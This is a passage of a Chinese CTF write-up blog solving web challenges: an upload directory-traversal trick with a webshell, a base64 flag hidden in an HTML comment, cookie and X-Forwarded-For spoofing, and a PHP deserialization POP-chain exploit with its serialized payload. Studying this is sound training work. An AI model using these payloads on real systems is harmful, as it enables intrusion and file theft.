../../../../../system/tmp/xmen 形成目录穿越。</p>\n<p>但像 <code>php, phtml, .htaccess</code>  什么的都上传不了，上传成功后可以编辑文件名、更换附件</p>\n<p>然后再回去，写一个一句话木马保存后，回到首页就可以操作了。</p>\n<h2 id=\"2023927\"><a class=\"anchor\" href=\"#2023927\">#</a> 2023/9/27</h2>\n<h3 id=\"hnctf-2022-week1what-is-web\"><a class=\"anchor\" href=\"#hnctf-2022-week1what-is-web\">#</a> [HNCTF 2022 Week1]What is Web</h3>\n<h4 id=\"前端信息收集\"><a class=\"anchor\" href=\"#前端信息收集\">#</a> 前端，信息收集</h4>\n<p>简单题，秒了！</p>\n<p>第一步，检查网页源代码。</p>\n<p>第二步，ctrl+F 搜索 &lt;!</p>\n<p>看到：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!--f|l|a|g|is|base64decode(TlNTQ1RGe0hlbGwwX1dlYmVyX1dlYzBtM19jb21lXzJfd2ViX3cwcjFkIX0=)--></span></pre></td></tr></table></figure><p>第三步，base64 解码。</p>\n<h2 id=\"2023928\"><a class=\"anchor\" href=\"#2023928\">#</a> 2023/9/28</h2>\n<h3 id=\"hnctf-2022-week1interesting_http\"><a class=\"anchor\" href=\"#hnctf-2022-week1interesting_http\">#</a> [HNCTF 2022 Week1]Interesting_http</h3>\n<h4 id=\"http协议\"><a class=\"anchor\" href=\"#http协议\">#</a> http 协议</h4>\n<p>打开题目后看到它礼貌的说：</p>\n<blockquote>\n<h5 id=\"please-post-me-a-want\"><a class=\"anchor\" href=\"#please-post-me-a-want\">#</a> Please post me a want !</h5>\n</blockquote>\n<p>那就给它传一个呗，</p>\n<blockquote>\n<p>want=haha</p>\n</blockquote>\n<p>回显：</p>\n<blockquote>\n<h5 id=\"and-you-must-tell-me-what-your-want-is\"><a class=\"anchor\" href=\"#and-you-must-tell-me-what-your-want-is\">#</a> And you must tell me what your want is?</h5>\n<h5 id=\"flag\"><a class=\"anchor\" href=\"#flag\">#</a> flag</h5>\n<h5 id=\"fuck-star\"><a class=\"anchor\" href=\"#fuck-star\">#</a> fuck star</h5>\n</blockquote>\n<p>那当然想要 fuck star 了.</p>\n<p>哈哈，不过没什么反应，还是要 flag 吧。</p>\n<blockquote>\n<p>want=flag</p>\n</blockquote>\n<p>回显：</p>\n<blockquote>\n<h5 id=\"not-admin\"><a class=\"anchor\" href=\"#not-admin\">#</a> Not admin!</h5>\n</blockquote>\n<p>可恶，那就检查一下 cookie 里面有没有东西吧，毕竟这种题目 admin 信息大都藏在 cookie 里。</p>\n<p>看到：</p>\n<blockquote>\n<p>user:notadmin</p>\n</blockquote>\n<p>改了：</p>\n<blockquote>\n<p>user:admin</p>\n</blockquote>\n<p>回显：</p>\n<blockquote>\n<h5 id=\"not-location\"><a class=\"anchor\" href=\"#not-location\">#</a> Not location</h5>\n</blockquote>\n<p>那就：</p>\n<blockquote>\n<p>X-Forwarded-For：127.0.0.1</p>\n</blockquote>\n<p>结束。</p>\n<h2 id=\"2023929\"><a class=\"anchor\" href=\"#2023929\">#</a> 2023/9/29</h2>\n<h3 id=\"第五空间-2021pklovecloud\"><a class=\"anchor\" href=\"#第五空间-2021pklovecloud\">#</a> [第五空间 2021] pklovecloud</h3>\n<h4 id=\"php反序列化php代码审计\"><a class=\"anchor\" href=\"#php反序列化php代码审计\">#</a> php 反序列化，php 代码审计</h4>\n<p>题目源码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">pkshow</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">echo_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>     </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span>          </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"Pk very safe^.^\"</span><span class=\"token punctuation\">;</span>      </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">acp</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#123;</span>   </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$cinder</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$neutron</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nova</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span>      </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cinder</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">pkshow</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>      </pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span>          </pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cinder</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cinder</span><span class=\"token operator\">-></span><span class=\"token function\">echo_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>      </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ace</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#123;</span>    </pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span>     </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$openstack</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$docker</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">echo_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>      </pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span>   </pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">openstack</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">docker</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">openstack</span><span class=\"token operator\">-></span><span class=\"token property\">neutron</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$heat</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">openstack</span><span class=\"token operator\">-></span><span class=\"token property\">neutron</span> <span class=\"token operator\">===</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">openstack</span><span class=\"token operator\">-></span><span class=\"token property\">nova</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"./<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">filename</span><span class=\"token punctuation\">&#125;</span></span>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>         </pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token punctuation\">&#123;</span>              </pre></td></tr><tr><td data-num=\"41\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            <span class=\"token keyword\">else</span> </pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            <span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"45\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"keystone lost~\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span>    </pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pks'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token variable\">$logData</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pks'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$logData</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token punctuation\">&#125;</span> </pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">else</span> </pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span>__file__<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>看到反序列化题目，我的思路是先看链子末端，也就是能拿到 flag 的地方，这题毫无疑问就在这里：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"./<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">filename</span><span class=\"token punctuation\">&#125;</span></span>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>              </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">else</span>  <span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"keystone lost~\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>注意到题目开头就引入 flag.php 文件，那极有可能 flag 就藏在这个文件中，不过值得沉思的是这题用不了伪协议了，因为这里：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"./<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">filename</span><span class=\"token punctuation\">&#125;</span></span>\"</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>它前面有个 './'，意思是处在当前目录。</p>\n<p>先不管前面是什么了，我们先看看他是由哪个函数调用的 ——echo_name (），找找它在哪里还出现过。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>      </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span>          </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cinder</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cinder</span><span class=\"token operator\">-></span><span class=\"token function\">echo_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>      </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>除了这个地方，pkshow 类中也存在，不过很明显我们目的是调用 acp 类中的，但我们发现 acp 类中的构造函数居然让 cinder 的值等于 pkshow 类，那不行，这个一会肯定的操作下。</p>\n<p>至于__toString 触发条件也很简单：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$logData</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pks'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$logData</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里的 echo 函数即可触发，不理解的可以看看我反序列化那篇文章。</p>\n<p>然后链子基本确定了，还有最后一个点，也就是最开始 echo_name () 函数中的</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">openstack</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">docker</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">openstack</span><span class=\"token operator\">-></span><span class=\"token property\">neutron</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$heat</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">openstack</span><span class=\"token operator\">-></span><span class=\"token property\">neutron</span> <span class=\"token operator\">===</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">openstack</span><span class=\"token operator\">-></span><span class=\"token property\">nova</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>看别人题解说是用指针引用来满足条件的，不过我当时没想那么多，压根就没给它赋值，误打误撞用 null === null 绕过了。</p>\n<p>so, 上题解：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">pkshow</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">echo_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"Pk very safe^.^\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">acp</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$cinder</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$neutron</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nova</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cinder</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ace</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 注意下这里，把构造函数改了改。</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cinder</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cinder</span><span class=\"token operator\">-></span><span class=\"token function\">echo_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ace</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$filename</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$openstack</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$docker</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">echo_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">openstack</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">docker</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">openstack</span><span class=\"token operator\">-></span><span class=\"token property\">neutron</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$heat</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">openstack</span><span class=\"token operator\">-></span><span class=\"token property\">neutron</span> <span class=\"token operator\">===</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">openstack</span><span class=\"token operator\">-></span><span class=\"token property\">nova</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"./<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">filename</span><span class=\"token punctuation\">&#125;</span></span>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"keystone lost~\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">acp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><blockquote>\n<p>？pks=O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3BN%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BN%3B%7D</p>\n</blockquote>\n<p>检查源代码看见：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$heat</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"asdasdasdasd53asd3a1sd3a1sd3asd\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$flag</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"flag in /nssctfasdasdflag\"</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>行，不过这里一定要注意，用目录穿越，不能直接 /nssctfasdasdflag，因为人家前面有./</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">pkshow</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span 